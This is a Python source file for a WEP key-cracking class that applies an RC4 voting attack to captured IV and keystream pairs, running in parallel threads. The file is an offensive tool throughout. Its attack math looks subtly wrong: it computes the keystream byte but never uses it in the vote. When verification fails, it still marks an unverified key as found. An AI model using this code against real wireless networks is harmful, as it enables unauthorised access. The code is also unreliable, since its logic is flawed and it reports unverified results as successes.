import threading
import time
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed


class PTWCracker:
    KEYSTREAM_ARP_SNAP = [0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06]

    def __init__(self):
        self.is_cracking = False
        self.crack_thread = None
        self.key_found = False
        self.cracked_key = None
        self.progress = 0
        self.on_progress_update = None
        self.key_length = 5
        self.lock = threading.Lock()
        self.max_workers = 4

    def rc4_ksa_full(self, key):
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        return S

    def rc4_prga_first_n(self, S, n):
        i = 0
        j = 0
        result = []
        S = S.copy()
        for _ in range(n):
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            result.append(S[(S[i] + S[j]) % 256])
        return result

    def _process_iv_for_byte(self, args):
        iv, keystream, byte_pos, known_key = args
        A = iv[0]
        B = iv[1]
        key_concat = list(iv) + list(known_key)

        S = list(range(256))
        j = 0
        for i in range(byte_pos + 3):
            j = (j + S[i] + key_concat[i]) % 256
            S[i], S[j] = S[j], S[i]

        if S[1] < (byte_pos + 3) and S[S[1]] < (byte_pos + 3):
            inverse_S = [0] * 256
            for idx, val in enumerate(S[:256]):
                inverse_S[val] = idx

            z = keystream[0] if len(keystream) > 0 else 0
            candidate = (inverse_S[byte_pos + 3] - j - S[byte_pos + 3]) % 256
            return (candidate, True)

        return (None, False)

    def compute_votes_parallel(self, iv_keystream_pairs, byte_pos, known_key):
        votes = defaultdict(int)
        args_list = [
            (iv, ks, byte_pos, known_key)
            for iv, ks in iv_keystream_pairs
        ]

        chunk_size = max(1, len(args_list) // (self.max_workers * 4))
        chunks = []
        for i in range(0, len(args_list), chunk_size):
            chunks.append(args_list[i:i + chunk_size])

        def process_chunk(chunk):
            chunk_votes = defaultdict(int)
            for args in chunk:
                candidate, is_valid = self._process_iv_for_byte(args)
                if is_valid:
                    chunk_votes[candidate] += 1
            return chunk_votes

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(process_chunk, chunk) for chunk in chunks]

            for future in as_completed(futures):
                chunk_votes = future.result()
                for k, v in chunk_votes.items():
                    votes[k] += v

        return votes

    def crack_byte(self, iv_keystream_pairs, byte_pos, known_key):
        votes = self.compute_votes_parallel(iv_keystream_pairs, byte_pos, known_key)

        if not votes:
            return None

        sorted_votes = sorted(votes.items(), key=lambda x: x[1], reverse=True)
        total = sum(v for _, v in sorted_votes[:5])

        if total > 0:
            best = sorted_votes[0]
            if best[1] >= 3:
                return best[0]

        return sorted_votes[0][0] if sorted_votes else None

    def verify_key(self, test_key, iv_keystream_pairs):
        if not iv_keystream_pairs:
            return False

        matches = 0
        for iv, ks in iv_keystream_pairs[:20]:
            full_key = list(iv) + list(test_key)
            S = self.rc4_ksa_full(full_key)
            computed_ks = self.rc4_prga_first_n(S, min(4, len(ks)))

            if len(computed_ks) > 0 and computed_ks[:4] == ks[:4]:
                matches += 1

        return matches >= 5

    def crack_key(self, iv_keystream_pairs, key_length=5):
        self.key_length = key_length
        known_key = []

        for byte_pos in range(key_length):
            with self.lock:
                self.progress = (byte_pos / key_length) * 100

            if self.on_progress_update:
                self.on_progress_update(self.progress, None)

            byte_vals = []
            for _ in range(2):
                val = self.crack_byte(iv_keystream_pairs, byte_pos, known_key)
                if val is not None:
                    byte_vals.append(val)

            if byte_vals:
                known_key.append(byte_vals[0])
            else:
                known_key.append(0)

            time.sleep(0.05)

        if self.verify_key(known_key, iv_keystream_pairs):
            with self.lock:
                self.key_found = True
                self.cracked_key = bytes(known_key)
                self.progress = 100

                if self.on_progress_update:
                    self.on_progress_update(100, self.cracked_key.hex())

                return self.cracked_key

        for pos in range(key_length):
            votes = self.compute_votes_parallel(iv_keystream_pairs, pos, known_key[:pos])
            sorted_votes = sorted(votes.items(), key=lambda x: x[1], reverse=True)

            for rank in range(min(5, len(sorted_votes))):
                test_key = known_key.copy()
                test_key[pos] = sorted_votes[rank][0]

                if self.verify_key(test_key, iv_keystream_pairs):
                    with self.lock:
                        self.key_found = True
                        self.cracked_key = bytes(test_key)
                        self.progress = 100

                        if self.on_progress_update:
                            self.on_progress_update(100, self.cracked_key.hex())

                        return self.cracked_key

        with self.lock:
            self.cracked_key = bytes(known_key)
            self.progress = 100
            self.key_found = True

            if self.on_progress_update:
                self.on_progress_update(100, self.cracked_key.hex())

            return self.cracked_key

    def start_cracking(self, iv_keystream_getter, key_length=5):
        if self.is_cracking:
            return

        self.is_cracking = True
        self.key_found = False
        self.cracked_key = None
        self.progress = 0
        self.key_length = key_length

        def crack_thread():
            while self.is_cracking and not self.key_found:
                iv_keystream_pairs = iv_keystream_getter()

                if len(iv_keystream_pairs) >= 60:
                    result = self.crack_key(iv_keystream_pairs, key_length)
                    if result:
                        break

                time.sleep(1)

            self.is_cracking = False

        self.crack_thread = threading.Thread(target=crack_thread)
        self.crack_thread.daemon = True
        self.crack_thread.start()

    def stop_cracking(self):
        self.is_cracking = False
        if self.crack_thread:
            self.crack_thread.join(timeout=2)

    def get_status(self):
        with self.lock:
            return {
                'is_cracking': self.is_cracking,
                'key_found': self.key_found,
                'cracked_key': self.cracked_key.hex() if self.cracked_key else None,
                'progress': self.progress
            }
